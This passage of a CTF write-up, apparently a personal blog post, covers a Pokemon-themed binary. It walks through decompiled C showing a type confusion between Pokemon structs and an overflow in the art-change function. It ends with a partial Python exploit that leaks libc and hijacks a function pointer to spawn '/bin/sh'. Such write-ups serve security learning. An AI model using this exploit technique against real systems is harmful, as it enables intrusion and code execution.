</span><span class='line'>    <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">profile</span> <span class="o">=</span> <span class="n">Profile</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Battle</span><span class="p">(</span><span class="n">Pokemon1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">HP</span><span class="o">?</span><span class="p">,</span> <span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">dword87C</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">Pokemon1</span><span class="o">-&gt;</span><span class="n">dword880</span><span class="p">,</span> <span class="n">Pokemon1</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">type</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">Pokemon2</span> <span class="o">=</span> <span class="p">(</span><span class="n">struct_buf</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x214u</span><span class="p">);</span>
</span><span class='line'>    <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword0</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">ukaK</span><span class="err">&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">word4</span> <span class="o">=</span> <span class="err">&#39;</span><span class="n">an</span><span class="err">&#39;</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">byte6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">charF</span><span class="p">,</span> <span class="n">a_________</span><span class="p">);</span>
</span><span class='line'>    <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword20C</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">off_804BF7C</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword204</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword208</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword210</span> <span class="o">=</span> <span class="n">Profile_</span><span class="p">;</span>
</span><span class='line'>    <span class="n">Battle</span><span class="p">(</span><span class="n">Pokemon2</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword204</span><span class="p">,</span> <span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword208</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">Pokemon2</span><span class="o">-&gt;</span><span class="n">dword20C</span><span class="p">,</span> <span class="n">Pokemon2</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>i find out vulnerability in Battle function that wild producted function include. it is type confusion.</p>

<p>this vulnerability is happened when i throw pokeball to wild pokemon with filling all of pokeball room</p>

<figure class='code'><figcaption><span>[type confusion] (kappavuln.c)</span> <a href='http://mashirogod.github.io/codeview/kappavuln.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;What would you like to name this Pokemon?&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">argv2</span> <span class="o">+</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">argv2</span><span class="p">,</span> <span class="mh">0xEu</span><span class="p">))</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">argv1</span><span class="p">;</span>
</span><span class='line'>      <span class="n">type_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">a2</span><span class="p">;</span>
</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Oh no! you don&#39;t have any more room for a Pokemon! Choose a pokemon to replace!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">v7</span> <span class="o">=</span> <span class="n">sub_80488C9</span><span class="p">();</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">v7</span> <span class="o">&lt;=</span> <span class="mi">4</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">v7</span><span class="p">));</span>
</span><span class='line'>      <span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">v7</span><span class="p">)</span> <span class="o">=</span> <span class="n">argv1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Invalid Choice!&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>it ignore their type, blindly cover type field. then attacker can overflow in select 5</p>

<figure class='code'><figcaption><span>[change art] (kappaart.c)</span> <a href='http://mashirogod.github.io/codeview/kappaart.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">change_art</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">ssize_t</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// eax@2</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">src</span><span class="p">[</span><span class="mi">4000</span><span class="p">];</span> <span class="c1">// [sp+10h] [bp-FB8h]@2</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [sp+FB0h] [bp-18h]@1</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+FB4h] [bp-14h]@1</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+FB8h] [bp-10h]@1</span>
</span><span class='line'>  <span class="kt">size_t</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+FBCh] [bp-Ch]@1</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">v5</span> <span class="o">=</span> <span class="n">sub_80488C9</span><span class="p">();</span>
</span><span class='line'>  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">v5</span><span class="p">);</span>
</span><span class='line'>  <span class="n">n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">15</span><span class="p">));</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="n">v0</span> <span class="p">)</span>
</span><span class='line'>    <span class="n">v0</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">src</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">n</span> <span class="o">-</span> <span class="n">i</span><span class="p">);</span>
</span><span class='line'>  <span class="n">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">15</span><span class="p">),</span> <span class="n">src</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span><span class='line'>  <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="n">n</span> <span class="o">+</span> <span class="mi">15</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;I&#39;m sure you&#39;ll love to show this new art to your friends!&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>change artwork function change each other pokemon artwork(heap+15). if i cover type using vunlerblilty.</p>

<p>kakuna struct:
|name|      art      |0x878|hp|attack|technic|func_ptr</p>

<p>charizar struct:
|name|       art      |0x204|hp|attack|technic|func_ptr</p>

<figure class='code'><figcaption><span>[exploit] (kappaexploit.c)</span> <a href='http://mashirogod.github.io/codeview/kappaexploit.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">vuln_execute</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax@1</span>
</span><span class='line'>  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-Ch]@1</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">result</span> <span class="o">=</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Here are all of the stats on your current Pokemon!&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">result</span> <span class="p">)</span>
</span><span class='line'>      <span class="k">break</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span> <span class="n">type_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__cdecl</span> <span class="o">**</span><span class="p">)(</span><span class="n">_DWORD</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x17E</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">type_data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__cdecl</span> <span class="o">**</span><span class="p">)(</span><span class="n">_DWORD</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x221</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>      <span class="n">result</span> <span class="o">=</span> <span class="n">type_data</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="o">==</span> <span class="mi">2</span> <span class="p">)</span>
</span><span class='line'>        <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="p">((</span><span class="kt">int</span> <span class="p">(</span><span class="kr">__cdecl</span> <span class="o">**</span><span class="p">)(</span><span class="n">_DWORD</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">132</span><span class="p">))(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">My_poke</span> <span class="o">+</span> <span class="n">i</span><span class="p">));</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Do you find out?</p>

<p>i change charizar to kakuna, set free func_ptr using above function</p>

<p>this is final payload</p>

<figure class='code'><figcaption><span>[Payload] (kappa_final.py)</span> <a href='http://mashirogod.github.io/codeview/kappa_final.py'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="kn">from</span> <span class="nn">pwn_expoit</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="k">def</span> <span class="nf">libc</span><span class="p">():</span>
</span><span class='line'>  <span class="n">s</span> <span class="o">=</span> <span class="n">Netcon</span><span class="p">(</span><span class="s">&#39;192.168.224.152&#39;</span><span class="p">,</span><span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Pokemon?&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;name</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">):</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Pokemon?&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;shot</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>      <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;1</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;3. Run&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;Pokemon?&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">name</span> <span class="o">=</span> <span class="s">&quot;/bin/sh</span><span class="se">\x00</span><span class="s">&quot;</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;5</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">dat</span>  <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">509</span>
</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048512</span><span class="p">)</span>
</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048766</span><span class="p">)</span>
</span><span class='line'>  <span class="n">dat</span> <span class="o">+=</span> <span class="s">&quot;C&quot;</span><span class="o">*</span><span class="mi">1610</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">dat</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;3</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">r</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;artwork&quot;</span><span class="p">)[</span><span class="mh">0xf85</span><span class="p">:</span><span class="mh">0xf89</span><span class="p">])</span>
</span><span class='line'>  <span class="n">argv</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>  <span class="n">argv</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="n">argv</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">argv</span>
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">r</span><span class="p">):</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;5</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s">&quot;5. name&quot;</span><span class="p">)</span>
